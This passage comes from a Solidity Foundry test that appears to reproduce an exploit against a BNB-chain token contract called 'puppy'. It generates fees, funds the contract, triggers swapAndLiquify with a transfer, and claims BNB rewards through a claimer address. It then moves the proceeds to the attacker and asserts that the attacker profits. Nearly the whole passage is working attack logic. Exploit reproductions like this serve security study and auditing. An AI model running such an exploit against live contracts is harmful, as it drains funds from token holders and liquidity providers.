        if (contractTokenBalance < minTokenNumberToSell) {
            console.log("Generating fees...");
            _generateFees();
        }

        // Check contract balance again
        contractTokenBalance = puppy.balanceOf(TARGET);
        console.log("Contract token balance after fee generation:", contractTokenBalance);

        // Ensure swapAndLiquify is enabled
        require(puppy.swapAndLiquifyEnabled(), "swapAndLiquify not enabled");

        // Give contract some BNB for the swap
        deal(TARGET, 0.1 ether);

        // Now trigger swapAndLiquify by making a transfer
        console.log("Making transfer to trigger swapAndLiquify...");
        _triggerSwapAndLiquify();

        // Wait a bit for any state changes
        vm.roll(block.number + 1);

        // Check contract BNB balance after swapAndLiquify
        uint256 contractBNBBalance = TARGET.balance;
        console.log("Contract BNB balance after swapAndLiquify:", contractBNBBalance);

        // Now we need to claim BNB reward from the claimer EOA
        console.log("Current timestamp:", block.timestamp);

        // Claim BNB reward from claimer address
        console.log("Claiming BNB reward from claimer EOA...");
        uint256 claimedAmount = _claimRewards(claimer);

        console.log("Claimer profit:", claimedAmount);

        // Transfer claimed BNB back to attacker (optional)
        if (claimedAmount > 0) {
            vm.prank(claimer);
            (bool success, ) = address(this).call{value: claimedAmount}("");
            require(success, "Transfer failed");
        }

        // Check final attacker balance
        uint256 finalAttackerBalance = address(this).balance;
        console.log("Initial attacker BNB balance:", initialAttackerBalance);
        console.log("Final attacker BNB balance:", finalAttackerBalance);
        console.log("Profit:", finalAttackerBalance - initialAttackerBalance);

        // Verify profit
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker should have profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
